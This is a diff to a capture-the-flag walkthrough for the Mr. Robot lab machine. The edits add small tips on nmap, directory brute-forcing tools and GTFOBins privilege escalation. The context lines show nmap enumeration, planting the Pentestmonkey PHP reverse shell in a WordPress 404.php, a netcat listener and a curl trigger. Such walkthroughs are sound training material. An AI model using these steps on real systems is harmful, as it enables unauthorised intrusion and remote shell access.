@@ -24,7 +24,7 @@ PORT    STATE  SERVICE
 
 		echo 192.168.30.130 mrrobot >> /etc/hosts
 
-### Enumerate website
+### Enumerate website (can add -p 80 to speed things up since we only want to enumerate port 80)
 
 		nmap -A --script=http-enum mrrobot
 
@@ -73,6 +73,7 @@ OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
 OS details: Linux 3.10 - 4.11
 Network Distance: 1 hop
 
+stuff like dirbuster or gobuster work just as well
 
 ### Robots.txt
 
@@ -188,7 +189,7 @@ Copy and paste Pentestmonkey PHP Reverse Shell script. (Don't forget to set the 
 
 		nc -lvp 7777
 
-### Access the page to get reverse shell running
+### Access the page to get reverse shell running (can also just access in browser)
 
 		
 		curl mrrobot/wp-content/themes/twentyfourteen/404.php
@@ -206,3 +207,5 @@ there's nmap!
 		whoami
 
 
+
+why nmap? google for "gtfobins". if you have suid or sudo permissions, that webside will tell you if you can use it to priv esc
